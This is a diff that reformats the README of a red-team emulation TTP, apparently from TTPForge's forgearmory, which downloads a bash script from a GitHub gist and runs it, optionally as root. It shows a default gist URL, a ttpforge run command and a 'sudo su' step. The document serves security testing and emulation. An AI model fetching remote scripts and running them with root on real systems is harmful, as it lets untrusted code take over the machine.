@@ -6,16 +6,25 @@ This TTP enables the execution of an arbitrary bash script from a GitHub gist.
 
 ## Arguments
 
-- **escalate_privileges**: Whether to escalate privileges before running the script (default: false).
-- **download_link**: The download link for the GitHub gist containing the bash script (default: https://gist.githubusercontent.com/l50/2dd5d552c0336e6e8fd7704fd0d194de/raw/0cd2d4d0be1cac1899fc45ff23df8a1ed9ea0409/gistfile1.txt).
+- **escalate_privileges**: Whether to escalate privileges before running the
+  script
 
-## Pre-requisites
+  Default: false
 
-1. The executor must have access to the specified GitHub gist and the ability to execute bash scripts.
+- **download_link**: The download link for the GitHub gist containing the bash
+  script
+
+  Default: <https://gist.githubusercontent.com/l50/2dd5d552c0336e6e8fd7704fd0d194de/raw/0cd2d4d0be1cac1899fc45ff23df8a1ed9ea0409/gistfile1.txt>
+
+## Requirements
+
+1. The executor must have access to the specified GitHub gist and the ability
+   to execute bash scripts.
 
 ## Examples
 
 You can run the TTP using the following example (after updating the arguments):
+
 ```bash
 ttpforge run forgearmory//exectution/arbitrary-script-execution-using-curl-to-pipe/arbitrary-script-execution-using-curl-to-pipe.yaml \
   --arg escalate_privileges=true
@@ -23,12 +32,15 @@ ttpforge run forgearmory//exectution/arbitrary-script-execution-using-curl-to-pi
 
 ## Steps
 
-1. **ensure-root-user-if-required**: This step checks if the TTP needs to be run as root, and exits with an error message if it is not being run as root.
-2. **download-and-run-script**: This step downloads the bash script from the specified GitHub gist and executes it. If the script runs successfully, the TTP exits with a success message. Otherwise, it exits with a failure message.
+1. **ensure-root-user-if-required**: This step checks if the TTP needs to be
+   run as root, and exits with an error message if it is not being run as root.
+1. **download-and-run-script**: This step downloads the bash script from the
+   specified GitHub gist and executes it. If the script runs successfully, the
+   TTP exits with a success message. Otherwise, it exits with a failure message.
 
 ## Manual Reproduction Steps
 
-```
+```bash
 # Escalate privileges to root (optional - depends on what you're running)
 sudo su
 
